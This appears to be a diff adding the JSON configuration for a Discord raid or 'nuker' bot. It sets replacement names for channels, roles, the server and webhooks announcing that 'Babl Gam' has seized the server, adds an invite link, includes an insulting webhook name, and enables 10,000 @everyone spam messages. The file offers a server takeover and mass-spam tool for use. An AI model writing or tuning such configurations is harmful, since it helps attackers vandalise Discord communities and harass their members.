@@ -1,0 +1,28 @@
+{
+    "Token": "BOT_TOKEN",
+    "Prefix": "?",
+    "Channel-Names": [
+        "@everyone Babl Gam Je preuzeo server https://discord.gg/TCkqKrWt6b",
+        "Babl Gam Je preuzeo server"
+    ],
+    "Server-Names": [
+        "Babl Gam Je preuzeo server"
+    ],
+    "Role-Names": [
+        "Babl Gam Je preuzeo server",
+        "Babl Gam Je preuzeo server https://discord.gg/TCkqKrWt6b"
+    ],
+    "Reason": [
+        "Babl Gam Je preuzeo server https://discord.gg/TCkqKrWt6b",
+        "Babl Gam Je preuzeo server"
+    ],
+    "Spam": true,
+    "Webhook-Names": [
+        "GET NUKED BITCH",
+        "made by masked1337"
+    ],
+    "name": "babl gam",
+    "Spam-Messages": "@everyone Babl Gam Je preuzeo server. ",
+    "Spam-Invite": "@everyone Babl Gam Je preuzeo server https://discord.gg/TCkqKrWt6b ",
+    "Spam-Amount": 10000
+}
